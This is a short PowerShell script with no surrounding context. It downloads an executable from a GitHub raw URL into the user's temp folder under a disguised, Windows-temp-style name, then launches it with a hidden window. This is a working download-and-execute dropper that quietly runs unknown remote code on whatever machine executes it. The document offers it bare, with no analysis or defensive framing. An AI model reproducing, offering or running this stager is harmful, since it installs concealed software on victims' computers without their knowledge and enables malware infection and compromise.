New-Item "$env:temp\wsuA58F.tmp"
(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
